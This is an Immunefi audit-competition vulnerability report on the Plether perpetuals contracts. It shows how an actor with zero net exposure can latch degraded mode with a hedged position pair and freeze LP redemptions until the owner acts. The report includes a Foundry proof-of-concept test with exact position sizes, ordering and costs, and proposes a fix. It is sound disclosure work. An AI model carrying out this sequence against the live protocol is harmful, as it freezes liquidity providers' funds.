# \#99167 [SC-High] A hedged pair at the admission limit latches degraded mode and keeps LP settlement frozen after solvency returns until the owner acts

**Submitted on Nov 12th 2026 at 09:11:05 UTC by @Nyksx for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99167
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Summary

Risk-increasing opens are admitted with only a 25 bps settlement buffer over the larger side's maximum profit, and closing a winning position on the side with the smaller maximum profit pays out of pool cash without reducing that liability, so a self-hedged LONG/SHORT pair sized to the admission limit latches `degradedMode` after a 1% basket decline. Only the engine owner can clear the latch, also after the book is solvent again, and until then LP epoch settlement (junior and senior redemptions and deposit activations) and new opens are blocked; if the attacker keeps the losing leg, the owner must first inject the shortfall.

## Finding Description

Liability is the larger of the two sides' aggregate maximum profit. A LONG's maximum profit is its entry cost (price falls to zero) and a SHORT's is `CAP_PRICE` minus its entry cost, so for equal LONG and SHORT sizes, as in the hedged pair, the SHORT side sets `L` below a basket price of 1.00:

```solidity
// packages/perps/src/CfdMath.sol:85-89 (a82d4fef)
if (side == CfdTypes.Side.LONG) {
    return entryCostAssetAtoms; // LONG max profit = size * entry price
}
uint256 capValueAssetAtoms = lots * capPrice;
return capValueAssetAtoms > entryCostAssetAtoms ? capValueAssetAtoms - entryCostAssetAtoms : 0; // SHORT = size * (CAP - entry)

// packages/perps/src/CfdEngine.sol:1044-1050 (a82d4fef)
function _maxLiability() internal view returns (uint256) {
    (SideState storage longState, SideState storage shortState) = _longAndShortStates();
    return
        longState.maxProfitAssets > shortState.maxProfitAssets // L = max(side); the other side is ignored
            ? longState.maxProfitAssets
            : shortState.maxProfitAssets;
}
```

An open is admitted while post-open `E >= L + B`, where `E` is pool cash net of trader claims and `B = ceil(L * 25 / 10_000)`:

```solidity
// packages/perps/src/libraries/CfdEnginePlanLib.sol:770-772 (a82d4fef)
satisfied = SolvencyAccountingLib.hasRequiredSettlementBuffer(
    result.effectiveAssetsAfterAssets, result.maxLiabilityAfterAssets, snap.settlementBufferBps // only 25 bps of headroom
);
```

Each close re-checks raw solvency and sets a sticky flag when `E < L`:

```solidity
// packages/perps/src/CfdEngine.sol:1306-1322 (a82d4fef)
function _applyClose(...) internal {
    ...
    settlementSidecar.executeClose(delta, currentPosition, publishTime); // winner is paid from E
    ...
    _enterDegradedModeIfInsolvent(delta.account, 0);
    ...
}

// packages/perps/src/CfdEngine.sol:1351-1369 (a82d4fef)
function _enterDegradedModeIfInsolvent(address account, uint256 pendingPoolPayoutAssets) internal {
    if (degradedMode) {
        return;
    }
    uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
    ...
    uint256 maxLiabilityAssets = _maxLiability(); // unchanged when the closed leg was on the smaller side
    if (effectiveAssetsAfter < maxLiabilityAssets) {
        degradedMode = true; // latched; only the owner can reset it
        emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
    }
}
```

When a winning LONG closes into a book where the SHORT side sets `L`, its payout leaves `E` while `L` does not move. The offsetting loss of the SHORT leg is still unrealized and is not part of `E`. A LONG payout larger than the remaining headroom `E - L` (about `B` for a book at the admission limit) therefore latches the flag, although the book is hedged at the mark. The flag is not re-evaluated automatically. `clearDegradedMode()` re-checks `E >= L`, but only the owner can call it:

```solidity
// packages/perps/src/CfdEngine.sol:658-667 (a82d4fef)
function clearDegradedMode() external onlyOwner { // owner-only, even when E >= L
    if (!degradedMode) {
        revert CfdEngine__NotDegraded();
    }
    if (_availableCashForFreshPoolPayouts() < _maxLiability()) {
        revert CfdEngine__StillInsolvent();
    }
    degradedMode = false;
    emit DegradedModeCleared();
}
```

While the flag is set, LP epoch settlement, withdrawals from trader accounts with a position, and opens all revert:

```solidity
// packages/perps/src/HousePool.sol:832 and 1864-1870 (a82d4fef), reached from settleLpEpoch() through _settleLpEpoch()
_requireWithdrawalsLive(statusSnapshot);
...
function _requireWithdrawalsLive(HousePoolEngineViewTypes.HousePoolStatusSnapshot memory statusSnapshot) internal pure {
    if (statusSnapshot.degradedMode) {
        revert HousePool__DegradedMode(); // LP redemptions and deposit activations are blocked
    }
}

// packages/perps/src/CfdEngineSettlementSidecar.sol:274-276 (a82d4fef), withdrawal from an account with an open position
if (engine.degradedMode()) {
    revert ICfdEngineTypes.CfdEngine__DegradedMode();
}

// packages/perps/src/libraries/CfdEnginePlanLib.sol:318-321 (a82d4fef), open planning
if (effectiveSnap.degradedMode) {
    delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.DEGRADED_MODE;
    return delta;
}
```

The behavior occurs under these conditions:

1. Two accounts controlled by one actor open equal LONG and SHORT sizes, interleaved so the skew limit is not exceeded, until the book reaches `E = L + B`. The attacker's net price exposure is zero.
2. The basket declines far enough that the LONG leg's payout, after fees and VPI, exceeds the headroom. With the release parameters, a 1% decline (0.800 to 0.792) is enough on a 1,000,000 USDG pool. At entry prices below half of `CAP_PRICE` only a decline works, because a rise makes the SHORT leg, which sets `L`, the winner, and closing it lowers `L` by more than it pays out.
3. The attacker closes the LONG leg first. `E` drops to 997,721.11 USDG against `L` = 999,360 USDG, and the flag latches.
4. The attacker then takes one of two paths. If it also closes the SHORT leg, the book is solvent (`E` = 1,005,492.09 USDG against `L` = 8,000 USDG) but stays latched. If it keeps the SHORT leg, raw `E < L` persists and `clearDegradedMode()` reverts until the owner recapitalizes the gap.

The latch and its owner-only clear are documented. `WHITEPAPER.md:1335-1339` states: "Degraded mode is not a global pause. It is a latched containment response to a terminal transition that the protocol deliberately allowed to finish; it does not auto-clear merely because a later mark looks solvent. After genuine restoration to \(A_{\mathrm{eff}}\ge L_{\max}\), the owner may clear the latch through the explicit recovery path." `ACCOUNTING_SPEC.md:619-620` adds that "A healthy projection does not itself clear an existing latch; only an authorized `clearDegradedMode()` call does that.", and `SECURITY.md:340` and the runbook at `SECURITY.md:1505-1511` describe the same containment and clear conditions. The documentation also reports latches arising from simulated trading: `WHITEPAPER.md:1578-1580` states that "The \(C=2.5\) and \(C=3\) runs also triggered and, under the stated research assumption, later owner-cleared degraded mode twice and four times respectively." Those runs use caps other than the release `CAP_PRICE` of 2.00 (`DEPLOYMENT.md:130`), the paragraph names latches only for the 2.50 and 3.00 runs, and `WHITEPAPER.md:1467-1468` notes that the replay's "reference endpoint-solvency predicate predates and does not model the production settlement buffer".

The concern is the admission gap that precedes it: a book that the `E >= L + B` check accepted can be moved into the latch at the release parameters through one ordinary close, deliberately and at a known cost, by an actor whose net price exposure is zero. Closing the same two legs in the opposite order reaches the same flat positions without a latch. No prior audit item and no Known Limitations entry (`SECURITY.md:1328-1457`) describes a deliberate trigger of the latch from an admitted book. 

## Impact Explanation

While the flag is set, `HousePool.settleLpEpoch()` reverts for all callers, so matured junior and senior redemption requests stay unfunded, deposit requests stay inactive, and new positions cannot be opened; this halts a core function of the pool for all LPs rather than for one account. In the flat variant of the proof of concept, a redemption of a quarter of the junior LP's shares (worth about 250,852 USDG) is still unfunded 25 hours after the latch, on a book with `E` = 1,005,492 USDG against `L` = 8,000 USDG, and the roughly 1,005,000 USDG of LP capital cannot be redeemed during that time. The documented recovery path is a single owner transaction, `clearDegradedMode()`, which needs no funds in the flat variant, so the freeze lasts until the owner acts and this report assumes no response deadline for that action; the attacker can repeat the sequence after a clear, given a new decline of similar size, at a similar per-cycle cost. In the held-leg variant the owner cannot clear the flag without first recapitalizing the 1,638.89 USDG gap, and third-party traders with an open position cannot withdraw free collateral (8,999.80 USDG in the test) unless they close their trade; the LP redemption in that variant would also stay unfunded without the latch, because `E < L + B` leaves no free cash above the `C + L + B` firewall (`SECURITY.md:342`).

## Likelihood Explanation

The trigger needs no privileged role and no special oracle behavior: the attacker needs deposits of about 8% of pool size (80,000 USDG for a 1,000,000 USDG pool), a basket decline of about 1% from the entry price while the pair is held, and one close order. The measured cost of the flat variant is 4,289.39 USDG with zero holding time, covering execution fees, VPI and the keeper bounties paid to a third-party keeper, which is about 1/234 of the frozen LP capital. Waiting for the decline adds LP-capital carry (`ACCOUNTING_SPEC.md:673-686`) on both legs: with a 24 hour hold the measured cost is 4,476.41 USDG (about 187 USDG per day, about 1/225 of the frozen capital), and the ratio falls further the longer the attacker waits.


## Recommendation

Consider letting anyone clear the latch once raw solvency is restored, so that a solvent book does not depend on an owner transaction. The existing `E >= L` check still prevents a premature clear:

```diff
-    function clearDegradedMode() external onlyOwner {
+    function clearDegradedMode() external {
         if (!degradedMode) {
             revert CfdEngine__NotDegraded();
         }
         if (_availableCashForFreshPoolPayouts() < _maxLiability()) {
             revert CfdEngine__StillInsolvent();
         }
```

## Proof of Concept

## Proof of Concept

The test uses the repository's `BasePerpTest` stack at `a82d4fef` with the `DEPLOYMENT.md` release risk parameters. It applies the release Router configuration (minimum open notional 1,000 USDG, adverse confidence multiplier 2,500 bps) through the Router timelock. Only Pyth (`MockPyth`) and USDG (`MockSettlementToken`) are mocked. Orders are committed through the `BasePerpTest` router, which is the test-only `LegacyOrderRouterHarness` (`packages/perps/test/utils/LegacyOrderRouterHarness.sol`); its scalar `commitOrder()` builds an order request with unbounded `ExecutionBounds` and delegatecalls the production V3 `commitOrder()`, and it overrides no production logic. A third-party keeper executes each order with `router.executeOrder()`, and LP settlement goes through the permissionless `router.settleLpEpoch()`. The setup helper `_fundJunior()` pranks the Router into `engine.updateMarkPrice()` once during the initial LP deposit, before any position exists (`BasePerpTest.sol:373-374`); the same mark is reachable through `router.updateMarkPrice()`. A dedicated LP holds the 1,000,000 USDG junior tranche and queues a redemption of a quarter of its shares.

- `test_Control_LosingLegFirst_NoLatch_LpRedemptionFunded()` (control) uses the same book and the same 1% decline, but the losing SHORT leg closes first. No latch is set, and the LP redemption is funded at the first matured epoch.
- `test_Attack_WinningLegFirst_LatchFreezesLpRedemptionsPast24h()` closes the winning LONG leg first, which latches the flag. After the SHORT leg also closes, the book is solvent, yet keeper settlement still reverts with `HousePool__DegradedMode` 2 hours and 25 hours later. Settlement resumes only after `clearDegradedMode()`.
- `test_Attack_OneDayHold_StillLatches_CostIncludesCarry()` holds the pair for 24 hours before the decline. The winning close still latches the flag, and the logged cost includes the carry paid by both legs.
- `test_Attack_LosingLegHeld_OwnerMustRecapitalize()` holds the SHORT leg. `clearDegradedMode()` reverts with `CfdEngine__StillInsolvent` both immediately and 25 hours later, and the bystander's 1 USDG withdrawal reverts with `CfdEngine__DegradedMode`. Clearing succeeds only after the owner calls `recapitalizePool()` for the shortfall. LP settlement also reverts in this variant, but there the redemption would stay unfunded without the latch as well, so the LP freeze is attributed to the flat variant.

Command (from the repository root):

```bash
forge test --root packages/perps --match-path test/Submission_H01.t.sol -vv
```

Key output (excerpt):

```text
[PASS] test_Attack_LosingLegHeld_OwnerMustRecapitalize()
  after opens: E: 1002000.937731
  after opens: L (SHORT side max profit): 999360.000000
  after opens: B (25 bps of L): 2498.400000
  bystander free settlement: 8999.800000
  held leg: E: 997721.106446
  held leg: L: 999360.000000
  owner recapitalization required to clear: 1638.893554
[PASS] test_Attack_OneDayHold_StillLatches_CostIncludesCarry()
  24 h hold: attacker cost (fees, VPI, bounties, carry): 4476.408421
[PASS] test_Attack_WinningLegFirst_LatchFreezesLpRedemptionsPast24h()
  after winning close: E: 997721.106446
  after winning close: L: 999360.000000
  attack final: E: 1005492.087237
  attack final: L: 8000.000000
  attacker cost (fees, VPI, keeper bounties): 4289.390916
  hours frozen so far: 25
  LP redemption paid after owner clear: 250851.731720
[PASS] test_Control_LosingLegFirst_NoLatch_LpRedemptionFunded()
  control final: E: 1003378.587922
  control final: L: 8000.000000
  control attacker cost: 2175.891601
  control: LP redemption paid: 250323.937193
Suite result: ok. 4 passed; 0 failed; 0 skipped
```

Test file `packages/perps/test/Submission_H01.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice A hedged LONG/SHORT pair opened up to the `E >= L + B` admission limit latches `degradedMode` when the
///         winning (smaller max-profit) leg closes after a 1% basket decline. The latch then blocks LP epoch settlement
///         (LP redemptions and deposit activations) until the engine owner calls `clearDegradedMode()`, also after the
///         book is solvent again, and the owner must recapitalize first while the attacker keeps the losing leg.
/// @dev    Release risk parameters (DEPLOYMENT.md) and release Router config. Only Pyth (MockPyth) and USDG
///         (MockSettlementToken) are mocked. Orders are committed through the BasePerpTest router, the test-only
///         `LegacyOrderRouterHarness`, whose scalar `commitOrder()` delegatecalls the production V3 `commitOrder()` with
///         unbounded `ExecutionBounds`; a third-party keeper executes them with `router.executeOrder()`, and LP
///         settlement goes through the permissionless `router.settleLpEpoch()`.
contract Submission_H01_Test is BasePerpTest {

    address internal constant ATTACKER_LONG = address(0xA77A14);
    address internal constant ATTACKER_SHORT = address(0xA77B14);
    address internal constant BYSTANDER = address(0xB0B014);
    address internal constant JUNIOR_LP = address(0x1A14);
    address internal constant KEEPER = address(0x4EE714);

    uint256 internal constant OPEN_PRICE = 0.8e8; // basket != $1.00
    uint256 internal constant MOVED_PRICE = 0.792e8; // -1.0% basket move: the LONG (smaller max-profit) leg wins
    uint256 internal constant LEG1 = 400_000e18;
    uint256 internal constant LEG2 = 432_800e18; // LEG1 + LEG2 sized to the E >= L + B admission limit
    uint256 internal constant ATTACKER_DEPOSIT = 40_000e6; // per account
    uint256 internal constant BYSTANDER_SIZE = 10_000e18; // ~8,000 USDG notional
    uint256 internal constant BYSTANDER_MARGIN = 1000e6;
    uint256 internal constant BYSTANDER_DEPOSIT = 10_000e6;
    uint256 internal constant LP_DEPOSIT = 1_000_000e6;

    uint256 internal lpRedeemShares;
    uint256 internal lpRedeemId;

    // ------------------------------------------------------------------ release configuration

    /// @dev DEPLOYMENT.md "Initial release parameters". Execution fee 4 bps, settlement buffer 25 bps and frozen-close
    ///      spread 50 bps are already the engine defaults in this stack.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev The 1,000,000 USDG junior tranche is held by a dedicated LP instead of the test contract (the owner).
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _fundJunior(JUNIOR_LP, LP_DEPOSIT);

        // Release Router initialization values (DEPLOYMENT.md), applied through the 72 h router timelock.
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = 1000e6;
        config.adverseConfidenceMultiplierBps = 2500;
        config.positionProtectionTriggerBountyAssets = 200_000;
        _setRouterConfig(config);
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release min open notional");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");

        // Start the scenario on the following Monday 06:00 UTC, away from weekend and FAD windows.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(OPEN_PRICE);

        _fundTrader(ATTACKER_LONG, ATTACKER_DEPOSIT);
        _fundTrader(ATTACKER_SHORT, ATTACKER_DEPOSIT);
        _fundTrader(BYSTANDER, BYSTANDER_DEPOSIT);
    }

    // ------------------------------------------------------------------ helpers

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _nextOracleSecond() internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        _nextOracleSecond();
        bytes[] memory data = _livePriceData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    /// @dev Real order path: the account commits, a third-party keeper executes with a post-commit Pyth update.
    function _routerTrade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "router order executed");
    }

    /// @dev Permissionless keeper LP settlement through the Router (fresh PoolReconcile mark, then HousePool settle).
    function _keeperSettleLp(
        uint256 price
    ) internal returns (bool ok, bytes4 err) {
        _nextOracleSecond();
        bytes[] memory data = _livePriceData(price);
        vm.prank(KEEPER);
        try router.settleLpEpoch(data) {
            ok = true;
        } catch (bytes memory reason) {
            if (reason.length >= 4) {
                err = bytes4(reason);
            }
        }
    }

    /// @dev E = pool.totalAssets() - trader claims (CfdEngine._availableCashForFreshPoolPayouts()).
    function _effectiveAssets() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    function _attackerBalance() internal view returns (uint256) {
        return clearinghouse.balanceAssets(ATTACKER_LONG) + clearinghouse.balanceAssets(ATTACKER_SHORT);
    }

    function _openPairAndBystander() internal {
        // Interleaved hedged pair (skew never exceeds maxSkewRatio), then an unrelated LONG bystander.
        _routerTrade(ATTACKER_LONG, CfdTypes.Side.LONG, LEG1, 12_000e6, false, OPEN_PRICE);
        _routerTrade(ATTACKER_SHORT, CfdTypes.Side.SHORT, LEG1, 12_000e6, false, OPEN_PRICE);
        _routerTrade(ATTACKER_LONG, CfdTypes.Side.LONG, LEG2, 13_000e6, false, OPEN_PRICE);
        _routerTrade(ATTACKER_SHORT, CfdTypes.Side.SHORT, LEG2, 13_000e6, false, OPEN_PRICE);
        _routerTrade(BYSTANDER, CfdTypes.Side.LONG, BYSTANDER_SIZE, BYSTANDER_MARGIN, false, OPEN_PRICE);

        uint256 e = _effectiveAssets();
        uint256 l = _maxLiability();
        uint256 b = (l * engine.settlementBufferBps() + 9999) / 10_000;
        emit log_named_decimal_uint("after opens: E", e, 6);
        emit log_named_decimal_uint("after opens: L (SHORT side max profit)", l, 6);
        emit log_named_decimal_uint("after opens: B (25 bps of L)", b, 6);
        assertGe(e, l + b, "each open was admitted at E >= L + B");
        assertFalse(engine.degradedMode(), "not degraded after opens");
    }

    /// @dev The junior LP queues a redemption of a quarter of its shares for the next LP epoch.
    function _lpRequestsRedeem() internal {
        lpRedeemShares = juniorVault.balanceOf(JUNIOR_LP) / 4;
        vm.prank(JUNIOR_LP);
        lpRedeemId = juniorVault.requestRedeem(lpRedeemShares, JUNIOR_LP, JUNIOR_LP);
        assertGt(lpRedeemShares, 0, "redeem request queued");
    }

    function _assertLpRedeemUnfunded() internal view {
        assertEq(juniorVault.claimableRedeemRequest(lpRedeemId, JUNIOR_LP), 0, "nothing claimable");
        assertEq(juniorVault.pendingRedeemRequest(lpRedeemId, JUNIOR_LP), lpRedeemShares, "request still pending");
    }

    function _lpClaimsRedeem() internal returns (uint256 assetsOut) {
        uint256 claimable = juniorVault.claimableRedeemRequest(lpRedeemId, JUNIOR_LP);
        assertEq(claimable, lpRedeemShares, "whole request funded");
        uint256 before = settlementToken.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeem(lpRedeemId, claimable, JUNIOR_LP, JUNIOR_LP);
        assetsOut = settlementToken.balanceOf(JUNIOR_LP) - before;
        assertGt(assetsOut, 200_000e6, "LP receives its redemption");
    }

    // ------------------------------------------------------------------ tests

    /// @dev Control: same book, same 1% move, same final state (attacker flat), but the losing SHORT leg closes first.
    ///      No latch is set and the LP redemption is funded at the first matured epoch.
    function test_Control_LosingLegFirst_NoLatch_LpRedemptionFunded() public {
        _openPairAndBystander();
        _lpRequestsRedeem();

        _refreshMark(MOVED_PRICE);
        _routerTrade(ATTACKER_SHORT, CfdTypes.Side.SHORT, LEG1 + LEG2, 0, true, MOVED_PRICE);
        _routerTrade(ATTACKER_LONG, CfdTypes.Side.LONG, LEG1 + LEG2, 0, true, MOVED_PRICE);
        assertFalse(engine.degradedMode(), "control: no latch");
        emit log_named_decimal_uint("control final: E", _effectiveAssets(), 6);
        emit log_named_decimal_uint("control final: L", _maxLiability(), 6);
        emit log_named_decimal_uint("control attacker cost", 2 * ATTACKER_DEPOSIT - _attackerBalance(), 6);

        vm.warp(vm.getBlockTimestamp() + 2 hours); // the redeem epoch has matured
        (bool ok,) = _keeperSettleLp(MOVED_PRICE);
        assertTrue(ok, "control: keeper LP settlement succeeds");
        uint256 out = _lpClaimsRedeem();
        emit log_named_decimal_uint("control: LP redemption paid", out, 6);
    }

    /// @dev Attack, attacker flat: closing the winning LONG leg first latches degradedMode. After the SHORT leg also
    ///      closes the book is solvent (E >= L), yet LP settlement stays blocked 2 h and 25 h later. Only the owner's
    ///      clearDegradedMode() restores it.
    function test_Attack_WinningLegFirst_LatchFreezesLpRedemptionsPast24h() public {
        _openPairAndBystander();
        _lpRequestsRedeem();

        _refreshMark(MOVED_PRICE);
        _routerTrade(ATTACKER_LONG, CfdTypes.Side.LONG, LEG1 + LEG2, 0, true, MOVED_PRICE);
        assertTrue(engine.degradedMode(), "winning hedged leg latches degraded mode");
        emit log_named_decimal_uint("after winning close: E", _effectiveAssets(), 6);
        emit log_named_decimal_uint("after winning close: L", _maxLiability(), 6);
        uint256 latchedAt = vm.getBlockTimestamp();

        _routerTrade(ATTACKER_SHORT, CfdTypes.Side.SHORT, LEG1 + LEG2, 0, true, MOVED_PRICE);
        (uint256 sizeLong,,,,,,) = engine.positions(ATTACKER_LONG);
        (uint256 sizeShort,,,,,,) = engine.positions(ATTACKER_SHORT);
        assertEq(sizeLong + sizeShort, 0, "attacker is flat");
        uint256 eFinal = _effectiveAssets();
        uint256 lFinal = _maxLiability();
        emit log_named_decimal_uint("attack final: E", eFinal, 6);
        emit log_named_decimal_uint("attack final: L", lFinal, 6);
        assertGt(eFinal, lFinal + 900_000e6, "book is solvent: E far above L");
        assertTrue(engine.degradedMode(), "latch persists on a solvent book");
        uint256 cost = 2 * ATTACKER_DEPOSIT - _attackerBalance();
        emit log_named_decimal_uint("attacker cost (fees, VPI, keeper bounties)", cost, 6);
        assertLt(cost, 5000e6, "attack costs under 5,000 USDG");

        // 2 h later the redeem epoch has matured; the keeper settlement reverts.
        vm.warp(latchedAt + 2 hours);
        (bool ok, bytes4 err) = _keeperSettleLp(MOVED_PRICE);
        assertFalse(ok, "LP settlement blocked");
        assertEq(err, IHousePool.HousePool__DegradedMode.selector, "HousePool__DegradedMode");
        _assertLpRedeemUnfunded();

        // 25 h after the latch: still blocked, nothing has changed without an owner transaction.
        vm.warp(latchedAt + 25 hours);
        (ok, err) = _keeperSettleLp(MOVED_PRICE);
        assertFalse(ok, "LP settlement still blocked after 25 h");
        assertEq(err, IHousePool.HousePool__DegradedMode.selector, "HousePool__DegradedMode after 25 h");
        _assertLpRedeemUnfunded();
        assertEq(pool.getMaxJuniorWithdraw(), 0, "junior withdraw capacity is zero");
        emit log_named_uint("hours frozen so far", (vm.getBlockTimestamp() - latchedAt) / 1 hours);

        // Only the owner (this test contract) can restore service.
        engine.clearDegradedMode();
        (ok,) = _keeperSettleLp(MOVED_PRICE);
        assertTrue(ok, "settlement resumes only after owner clear");
        uint256 out = _lpClaimsRedeem();
        emit log_named_decimal_uint("LP redemption paid after owner clear", out, 6);
    }

    /// @dev Attack, attacker flat, with the pair held for 24 h before the decline: carry accrues on both legs, the
    ///      winning close still latches degradedMode, and the logged cost includes that carry.
    function test_Attack_OneDayHold_StillLatches_CostIncludesCarry() public {
        _openPairAndBystander();

        vm.warp(vm.getBlockTimestamp() + 1 days);
        _refreshMark(MOVED_PRICE);
        _routerTrade(ATTACKER_LONG, CfdTypes.Side.LONG, LEG1 + LEG2, 0, true, MOVED_PRICE);
        assertTrue(engine.degradedMode(), "winning hedged leg latches degraded mode after a 24 h hold");
        _routerTrade(ATTACKER_SHORT, CfdTypes.Side.SHORT, LEG1 + LEG2, 0, true, MOVED_PRICE);
        (uint256 sizeLong,,,,,,) = engine.positions(ATTACKER_LONG);
        (uint256 sizeShort,,,,,,) = engine.positions(ATTACKER_SHORT);
        assertEq(sizeLong + sizeShort, 0, "attacker is flat");
        assertTrue(engine.degradedMode(), "latch persists");
        uint256 cost = 2 * ATTACKER_DEPOSIT - _attackerBalance();
        emit log_named_decimal_uint("24 h hold: attacker cost (fees, VPI, bounties, carry)", cost, 6);
    }

    /// @dev Attack, losing leg held: raw E < L persists, so clearDegradedMode() reverts StillInsolvent until the owner
    ///      injects the shortfall. Opens and the bystander's free-collateral withdrawal stay blocked past 24 h. Here
    ///      E < L + B, so the C + L + B withdrawal firewall would leave the LP redemption unfunded even without the latch.
    function test_Attack_LosingLegHeld_OwnerMustRecapitalize() public {
        _openPairAndBystander();
        _lpRequestsRedeem();

        _refreshMark(MOVED_PRICE);
        _routerTrade(ATTACKER_LONG, CfdTypes.Side.LONG, LEG1 + LEG2, 0, true, MOVED_PRICE);
        assertTrue(engine.degradedMode(), "winning hedged leg latches degraded mode");
        uint256 latchedAt = vm.getBlockTimestamp();

        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        vm.warp(latchedAt + 25 hours);
        (bool ok, bytes4 err) = _keeperSettleLp(MOVED_PRICE);
        assertFalse(ok, "LP settlement blocked after 25 h");
        assertEq(err, IHousePool.HousePool__DegradedMode.selector, "HousePool__DegradedMode");
        _assertLpRedeemUnfunded();

        uint256 free = _freeSettlementAssets(BYSTANDER);
        emit log_named_decimal_uint("bystander free settlement", free, 6);
        vm.prank(BYSTANDER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(BYSTANDER, 1e6);

        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        uint256 e = _effectiveAssets();
        uint256 l = _maxLiability();
        assertLt(e, l, "raw E < L while the SHORT leg is held");
        uint256 shortfall = l - e;
        emit log_named_decimal_uint("held leg: E", e, 6);
        emit log_named_decimal_uint("held leg: L", l, 6);
        emit log_named_decimal_uint("owner recapitalization required to clear", shortfall, 6);

        settlementToken.mint(address(this), shortfall);
        settlementToken.approve(address(engine), shortfall);
        engine.recapitalizePool(shortfall);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "cleared only after an owner-funded recapitalization");
    }

}
```
